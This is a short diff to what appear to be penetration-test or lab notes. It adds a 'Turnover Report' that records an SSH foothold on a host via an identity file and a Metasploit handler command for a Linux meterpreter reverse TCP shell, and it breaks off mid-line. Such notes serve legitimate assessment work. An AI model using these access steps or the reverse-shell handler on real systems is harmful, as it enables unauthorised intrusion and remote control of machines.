@@ -1754,4 +1754,12 @@ tcp   LISTEN    0      128             [::]:2222          [::]:*
 ```
 
 ## Turnover Report
-- 
+- Initial logon - ssh
+	- foothold@20.30.40.160:2222
+	- identity file
+		- super_secret_key
+- secondary
+	- reverse tcp shell
+		- msfconsole
+msf > handler -p linux/x64/meterpreter/reverse_tcp -H 0.0.0.0 -P 1111
+			- setup handler using the 
